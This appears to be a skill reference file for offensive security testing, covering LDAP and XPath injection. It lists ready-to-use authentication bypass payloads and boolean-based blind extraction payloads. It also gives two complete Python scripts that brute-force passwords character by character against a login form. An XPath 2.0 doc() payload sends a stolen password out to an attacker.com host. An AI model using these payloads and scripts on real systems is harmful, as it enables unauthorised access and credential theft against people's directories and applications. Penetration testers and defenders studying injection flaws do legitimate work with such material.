---
name: ldap_xpath_injection
description: LDAP filter injection and XPath injection - auth bypass, enumeration, bind DN attacks, boolean-based extraction
---

# LDAP & XPath Injection

LDAP injection occurs when user input is embedded in LDAP filter strings without sanitization, enabling auth bypass and directory enumeration. XPath injection targets XML data stores with similar consequences — auth bypass and data extraction.

## Attack Surface

**LDAP Entry Points**
- Login forms authenticating against Active Directory / OpenLDAP
- User search / directory lookup features
- Group membership checks
- Password reset flows querying directory by email/username
- Corporate SSO systems with LDAP backend
- Custom authentication middleware

**XPath Entry Points**
- XML-backed authentication systems
- Search fields querying XML databases
- SOAP/XML web services with user-supplied parameters
- Report generators parsing user-controlled XML paths
- CMS systems with XML configuration

## LDAP Injection

### Basic Filter Syntax

LDAP filters use prefix notation and logical operators:
```
(&(uid=admin)(password=secret))    # AND
(|(uid=admin)(uid=guest))          # OR
(!(uid=blocked))                    # NOT
(uid=*)                             # wildcard
```

### Authentication Bypass Payloads

```
# Username field injection — bypass password check
admin)(&)          → (&(uid=admin)(&)(password=anything))  → always true
admin)(%00         → null byte terminates filter
*)((uid=*)         → wildcard match
admin)(|(uid=*
*)(uid=*

# Classic bypass (inject into uid= and close filter)
uid: *)(uid=*  ,  pass: anything
→ (&(uid=*)(uid=*)(password=anything)) — matches first record

# Close the (&, inject OR condition
uid: admin)(|(password=*
pass: x))
```

### Blind Enumeration (Boolean-Based)

Test character-by-character:
```
# Does first char of admin password start with 'a'?
uid=admin)(userPassword=a*)(uid=admin
→ 200 = yes, 401 = no

# Python enumeration scaffold
import requests, string

target = "https://example.com/login"
charset = string.ascii_lowercase + string.digits + string.punctuation

found = ""
for pos in range(1, 50):
    for c in charset:
        payload = f"admin)(userPassword={found}{c}*)(uid=admin"
        r = requests.post(target, data={"username": payload, "password": "x"})
        if "Welcome" in r.text or r.status_code == 200:
            found += c
            break
    else:
        break
print("Password:", found)
```

### Attribute Enumeration via Wildcards

```
# Does the attribute 'mail' exist for uid=admin?
uid=admin)(mail=*)(uid=admin

# Does admin belong to the 'admins' group?
uid=admin)(memberOf=cn=admins,dc=example,dc=com)(uid=admin

# Extract all users
uid=*)
```

### Special Characters to Test

```
Input character → LDAP meaning if unescaped
*               → wildcard
(               → open filter
)               → close filter
\               → escape char
NUL (\x00)      → string terminator
```

Expected encoding (RFC 4515):
```
\ → \5c
* → \2a
( → \28
) → \29
NUL → \00
```

### OOB / Error-Based Exfil

```
# Force DNS lookup via attribute that resolves:
uid=admin)(objectClass=domain)(dc=attacker.com
# (only works on misconfigured servers doing referrals)
```

## XPath Injection

### Authentication Bypass

```xml
<!-- Normal query -->
//users/user[uid/text()='admin' and password/text()='secret']

<!-- Inject into uid field -->
uid:  admin' or '1'='1
pass: anything
→ //users/user[uid/text()='admin' or '1'='1' and password/text()='anything']
→ always true

<!-- Classic bypass -->
uid:  ' or 1=1 or ''='
uid:  admin') or ('1'='1
uid:  '] | //user/*[1=1 or '
```

### Blind Boolean-Based Extraction

```python
# Determine length of first user's password
' or string-length(//user[1]/password/text())=8 or ''='

# Extract char by char
' or substring(//user[1]/password/text(),1,1)='a' or ''='

# Python script
import requests

def query(payload, url):
    r = requests.post(url, data={"username": payload, "password": "x"})
    return "Login successful" in r.text

url = "https://example.com/login"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"

result = ""
for pos in range(1, 50):
    for c in charset:
        payload = f"' or substring(//user[1]/password/text(),{pos},1)='{c}' or ''='"
        if query(payload, url):
            result += c
            break
    else:
        break
print("Extracted:", result)
```

### XPath 2.0 (Saxon/XQuery)

```xpath
' or doc('http://attacker.com/?' || //user[1]/password/text()) = '' or ''='
# Exfiltrate data OOB via doc() function
```

### XPath Axis Traversal

```xpath
# Move up and traverse other nodes
']/..//secret[contains(.,'
# Access sibling elements
' or //secret/text()!='x
```

## Validation Approach

1. Inject `*)(uid=*` (LDAP) or `' or '1'='1` (XPath) into login fields
2. Successful login with no valid credentials = confirmed injection
3. Escalate to enumeration using boolean payloads
4. Document each step: payload → proxy request ID → response outcome
5. For auth bypass: show admin-level access achieved without valid password

## Tools

- `ldapsearch` — direct LDAP queries from terminal
- `ldapdomaindump` — dump AD info
- Burp Suite Intruder — boolean enumeration automation
- Custom Python scripts (scaffold above)
- `xmllint --xpath` — local XPath testing
